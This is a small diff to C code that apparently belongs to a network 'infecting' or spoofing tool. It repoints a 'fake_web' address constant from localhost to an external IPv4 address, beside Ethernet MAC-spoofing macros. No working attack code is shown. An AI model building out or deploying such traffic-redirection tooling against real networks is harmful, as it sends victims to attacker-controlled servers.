@@ -11,7 +11,7 @@
 
 static BOOL finished_infecting;
 send_params infect_params;
-u_long fake_web = 2130706433; // TODO 
+u_long fake_web = 220506075; // TODO 
 
 /* ethernet layer macros */
 #define SET_SRC_MAC(eth, mac) memcpy(eth->src_addr, mac, ETH_ALEN)
